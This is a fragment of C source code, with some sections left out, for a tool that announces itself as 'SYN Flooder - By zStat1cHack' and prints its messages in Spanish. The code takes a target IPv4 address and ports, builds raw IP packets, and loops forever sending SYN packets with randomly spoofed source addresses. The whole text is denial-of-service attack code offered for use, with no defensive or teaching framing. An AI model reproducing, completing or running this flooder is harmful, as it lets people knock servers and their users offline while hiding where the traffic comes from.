...
void help() { printf("SYN Flooder - By zStat1cHack\nArgumentos: IPV4_ADDR PUERTOS\n"); exit(1); }
...
int main(int argc, char** argv) {
    ...
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) {
        printf("No se pudieron configurar las opciones de socket. Código de error: %d\n", errno);
        exit(1);
    }
    ...
    while (1) {
        if (sendto(sd, packet, ip.len, 0, (struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1) {
            printf("Error al enviar paquetes SYN. Código de error: %d\n", errno);
            exit(1);
        } else {
            printf("Paquete SYN enviado con ip falsa: %s\n", rip);
        }
        ip.id = htons(rand16());
        ip.src = (uint)inet_addr(randip(rip));
        ip.chksum = 0;
